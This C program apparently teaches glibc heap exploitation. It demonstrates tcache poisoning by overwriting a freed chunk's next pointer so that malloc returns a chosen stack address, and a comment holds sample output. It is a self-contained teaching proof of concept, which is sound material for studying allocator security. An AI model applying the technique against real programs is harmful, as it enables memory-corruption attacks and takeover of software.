#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
	       "returning a pointer to an arbitrary location (in this case, the stack).\n"
	       "The attack is very similar to fastbin corruption attack.\n\n");

	size_t stack_var;
	fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);

	fprintf(stderr, "Allocating 1 buffer.\n");
	intptr_t *a = malloc(128);
	fprintf(stderr, "malloc(128): %p\n", a);
	fprintf(stderr, "Freeing the buffer...\n");
	free(a);

	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
	a[0] = (intptr_t)&stack_var;

	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *b = malloc(128);
	fprintf(stderr, "2st malloc(128): %p\n", b);
	fprintf(stderr, "We got the control\n");

	return 0;
}

/*

This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7ffe770c6330.
Allocating 1 buffer.
malloc(128): 0x55e547d56260
Freeing the buffer...
Now the tcache list has [ 0x55e547d56260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55e547d56260
to point to the location to control (0x7ffe770c6330).
1st malloc(128): 0x55e547d56260
Now the tcache list has [ 0x7ffe770c6330 ].
2st malloc(128): 0x7ffe770c6330
We got the control


*/